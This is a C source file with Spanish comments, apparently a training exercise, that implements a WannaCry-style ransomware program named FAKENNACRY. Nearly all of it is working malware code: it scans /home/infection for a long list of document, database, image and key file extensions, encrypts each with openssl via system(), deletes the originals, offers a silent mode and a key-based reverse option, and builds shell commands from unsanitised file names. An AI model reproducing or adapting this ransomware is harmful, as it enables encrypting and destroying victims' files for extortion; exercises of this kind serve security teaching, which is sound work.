#include <stdio.h>
#include <unistd.h>
#include <limits.h>
#include <stdlib.h>
#include <dirent.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <time.h>
#include <sys/uio.h>
#include <sys/types.h>

int encrypt_files(int silent);

size_t	ft_strlen(const char *s)
{
	size_t	x;

	x = 0;
	while (s[x])
		x++;
	return (x);
}

char	*ft_strjoin(char const *s1, char const *s2)

{
	size_t	x;
	size_t	y;
	char	*p;

	x = 0;
	y = 0;
	p = malloc(ft_strlen(s1) + ft_strlen(s2) + 1);
	if (p == NULL)
		return (NULL);
	while (s1[x] != '\0')
	{
		p[x] = s1[x];
		x++;
	}
	while (s2[y] != '\0')
	{
		p[x] = s2[y];
		x++;
		y++;
	}
	p[x] = '\0';
	return (&p[0]);
}

// Definición de las flags del programa y su gestión de mensajes en pantalla
int flags(char *s)
{
    int silent = 0;

    if (strcmp(s, "-help") == 0 || strcmp(s, "-h") == 0)
    {
        printf("Las opciones del programa son:\n-help o -h para que se muestre la ayuda del programa.\n-version o -v para consultar la versión.\n-reverse o -r seguido de la clave para revertir la infección.\n-silent o -s para que se el programa se ejecute sin mostrar el output por pantalla.\n");
        return (0);
    }
    else if (strcmp(s, "-version") == 0 || strcmp (s, "-v") == 0)
    {
        printf("Versión actual: FAKENNACRY 1.0\n");
        return (0);
    }
    else if (strcmp(s, "-silent") == 0 || (strcmp (s, "-s") == 0))
    {
        silent = 1;
        encrypt_files(silent);
        return(0);
    }
    return(-1);
}

char *key_generator(int silent) // generador de clave aleatoria de 16 caracteres

{
	char *key;

	key = malloc(sizeof(char) * (16 + 1));
	srand((unsigned int)(time(NULL))); // damos como variable de entrada la hora del sistema
	int index = 0;
	char char1[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/,.-+=~:";
	
	while (index < 16)
	{
		key[index] = (char1[rand() % (sizeof char1 - 1)]);
		index++;
	}
	key[index] = '\0';
	if (silent == 0)
		printf("La clave para revertir la infección es: %s\n", key);
	return (key);
}

// Comprobación de si el archivo tiene extensión .ft
int check_extension (char *file)
{
    int len;
    len = strlen(file);
  
    if ((file[len - 3] == '.') && (file[len - 2] == 'f') && (file[len - 1] == 't'))
	{
	return (0);
	}

    else
        return (-1);
}

int encrypt_file(char *file, char *key) // encriptación archivo con clave generada previamente
{
	char *str = "openssl enc -aes-256-cbc -pass pass:";
	char *str2 = " -in '";
	char *str3 = "' -out '";
	char *str4 = ".ft'";
	char *rm = "rm '";
	char *base64 = " -base64";			

	if (check_extension(file) == 0)
		return (-1);
	else
	{
		str = ft_strjoin(str, key);
		str = ft_strjoin(str, str2);
		str = ft_strjoin(str, file);
		str = ft_strjoin(str, str3);
		str = ft_strjoin(str, file);
		str = ft_strjoin(str, str4);
		str = ft_strjoin(str, base64);
	}
	system(str);
	rm = ft_strjoin(rm, file);
	rm = ft_strjoin(rm, "'");
	system(rm);
	return(0);
}

int encrypt_files(int silent) //encriptación de archivos. Recibe como parámetro "silent". Se incluyen las extensiones que debe encriptar y el directorio donde buscar los archivos
{
	char *path;
	path = "/home/infection";
	DIR *d;
	d = opendir(path);
	char *temp[2000] = {".der", ".pfx", ".key", ".cr", ".csr", ".p12", ".pem", ".od", ".o", ".sxw", ".stw", ".uo", ".3ds", ".max", ".3dm", ".txt", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".ba", ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz",
						".tar", ".bak", ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".sn", ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".tx", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".os", ".ps", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".po", ".pptm", ".pptx", ".pp", ".xltm", ".xltx", ".xlc", ".xlm", ".xl", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".do", ".docm", ".docb", ".docx", ".doc"};
	char *key;
	int i;
	char *str;
	char *file;
	int fd;
	char *extract_ft;
	extract_ft = "sudo find . -name \"*.ft\" > .ft_files"; // guardamos en un archivo todos los archivos previos que tuvieran extensión .ft para que al revertir la infección no se le quite la extensión propia .ft anterior

	system(extract_ft);

	i = 0;
	str = "chmod 666 ";
	file = ".stockholm.txt";
	
	if (d == NULL)
		return (-1);
	struct dirent *dir;
	key = key_generator(silent);
	while ((dir = readdir(d)) != NULL)
	{
		if (dir-> d_type != DT_DIR)
		{
			i = 0;
			while (temp[i])
			{
				if (strstr (dir->d_name, temp[i]) != NULL)
				{
					if (encrypt_file(dir-> d_name, key) == -1)
						break;
					if (silent == 1)
						break;
					else if (silent == 0)
					{
						printf("El archivo %s ha sido encriptado\n", dir-> d_name);
						break;
					}
				}
			i++;
			}
		}	
		else
			if(dir -> d_type == DT_DIR && strcmp(dir-> d_name,".")!=0 && strcmp(dir-> d_name,"..")!=0)
			{
					if (silent == 1)
						;
					else if (silent == 0)
					printf("El directorio %s no ha sido encriptado\n", dir->d_name);
			}
	}
	i = 0;
	fd = open(".stockholm.txt", O_RDWR | O_TRUNC | O_CREAT);
	str = ft_strjoin(str, file);
	system(str);

	while (key[i])
	{
		write(fd, &key[i], 1);
		i++;
	}
	close(fd);
	free(key);
	closedir(d);
	return(0);
}

char *extension_del(char *file) // función para borrar la extensión .ft al desencriptar
{
	int x;
	int len;
	char *result;

	x = 0;
	len = strlen(file);
	
	result = malloc(sizeof(char) * (len - 2));
	while (x != len - 3)
	{
		result[x] = file[x];
		x++;
	}
	result[x] = '\0';
	return (result);
}

int desencrypt_files(char *file, char *key) //desencriptado de cada archivo con el comando openssl y la contraseña generada previamente
{

	char *str = "openssl enc -aes-256-cbc -d -in '";
	char *str2 = "' -pass pass:";
	char *str3 = " -out '";
	char *outfile;
	char *rm = "rm '";
	char *base64 = " -base64";

	outfile = extension_del (file);
	str = ft_strjoin(str, file);
	str = ft_strjoin(str, str2);
	str = ft_strjoin(str, key);
	str = ft_strjoin(str, str3);
	str = ft_strjoin(str, outfile);
	str = ft_strjoin(str, "'");
	str = ft_strjoin(str, base64);
	system(str);
	rm = ft_strjoin(rm, file);
	rm = ft_strjoin(rm, "'");
	system(rm);
	return(0);
}

int ft_reverse(char *key) // revertir la infección
{

	char *buff = 0;
	long length;
	FILE *f = fopen (".ft_files", "rb");

	if (f)
	{
		fseek (f, 0, SEEK_END);
		length = ftell (f);
		fseek (f, 0, SEEK_SET);
		buff = malloc (length);
		if (buff) //almacenamos en la str "buff" los nombres de los archivos .ft previos para no desencriptarlos ni quitarles su extensión
		{
			fread(buff, 1, length, f);
		}
		fclose(f);
	} 

	char *path = "/home/infection";
	DIR *d;
	d = opendir(path);

	if (d == NULL)
		return (-1);
	struct dirent *dir;
	while ((dir = readdir(d)) != NULL)
	{
		if (dir-> d_type != DT_DIR)
		{
			if (check_extension(dir->d_name) == -1)
			continue;
			else
			{
				
				if (strstr(buff, dir->d_name)) // control de extensión .ft previa
					printf("El fichero %s tenía extensión .ft previa, no se desencripta\n", dir->d_name);
				else if ((desencrypt_files(dir->d_name, key)) == -1) // control de desencriptado con clave correcta
					printf("El fichero %s no se ha podido desencriptar\n", dir-> d_name);
						
				else
					printf("El archivo %s ha sido desencriptado\n", dir->d_name);
			}
		}
	}
	closedir(d);
	return(0);
}

int check_key (char *key) // comprobación de la clave generada y almacenada en .stockholm.txt
{
	char *result;
	int read_check;
	int fd;

	read_check = 1;
	
	fd = open(".stockholm.txt", O_RDONLY);
	result = malloc(sizeof(char) * (17));
	read_check = read(fd, result, 16);

	if (read_check == -1)
	{
		free (result);
		return (-1);
	}
	result[16] = '\0';
	close (fd);
	if (strcmp(result, key) == 0)
		return (0);
	else
		return (-1);
}

int main (int argc, char **argv)
{
	char *rm = "rm ";
	char *file = ".stockholm.txt";

	if ((argc > 3) || (argc < 1))
	{
		printf("El número de argumentos es incorrecto\n");
		return (-1);
	}
	if (argc == 1)
	{
		if (access(".stockholm.txt", F_OK) != -1)
		{
			file = ft_strjoin(rm, file);
			system(file);
		}
		if (encrypt_files(0) == -1)
		{
			printf("Error al desencriptar los ficheros\n");
			return (-1);
		}
	return (0);
	}
	// comprobación de que la flag sea válida y gestión en el caso de que sea -s o -silent
	else if ((argc == 2) && (strcmp ((argv[1]), "-s") != 0 || strcmp((argv[1]), "-silent") != 0)) 
	{
		if (flags(argv[1]) == -1) 
		{
			printf("Introduce una flag válida (-h para mostrar la ayuda)\n");
			return (-1);
		}
	}
	else if (argc == 3)
	{
		if (strcmp(argv[1], "-r") == 0 || strcmp(argv[1], "-reverse") == 0)
		{
			if (check_key(argv[2]) == -1)
			{
				printf("La clave de desencriptación introducida no es correcta\n");
				return (-1);
			}
			if (ft_reverse(argv[2]) == -1)
			{
				printf("Error al desencriptar los archivos, clave errónea\n");
				return (-1);
			}
		}
		else
		{
			printf("Error en comandos\n");
			return (-1);
		}
	}
	return (0);


}
